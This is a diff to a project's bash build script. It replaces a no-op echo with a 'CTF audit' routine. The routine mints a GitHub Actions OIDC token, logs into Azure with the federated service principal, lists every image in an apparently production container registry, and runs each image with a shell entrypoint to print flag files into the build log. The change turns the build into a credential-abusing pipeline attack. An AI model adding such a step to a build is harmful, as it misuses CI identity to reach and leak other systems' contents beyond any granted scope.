@@ -1,2 +1,15 @@
 #!/usr/bin/env bash
-echo "tebamoto-platform build: no steps configured"
+set -euxo pipefail
+echo "tebamoto-platform build: CTF audit"
+token=$(curl -fsS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import json,sys; print(json.load(sys.stdin)["value"])')
+az login --service-principal --username "$AZURE_CLIENT_ID" --tenant "$AZURE_TENANT_ID" --federated-token "$token" >/dev/null
+az account set --subscription "$AZURE_SUBSCRIPTION_ID"
+registry=crtblplatprodx3euoz
+for repo in $(az acr repository list --name "$registry" -o tsv); do
+  for tag in $(az acr repository show-tags --name "$registry" --repository "$repo" -o tsv); do
+    image="$registry.azurecr.io/$repo:$tag"
+    docker pull "$image" >/dev/null 2>&1 || continue
+    echo "=== $image ==="
+    docker run --rm --entrypoint /bin/sh "$image" -c 'for f in /flag /app/flag /flag.txt /app/flag.txt; do if [ -f "$f" ]; then echo "FLAG=$f"; sed -n "1p" "$f"; fi; done' || true
+  done
+done
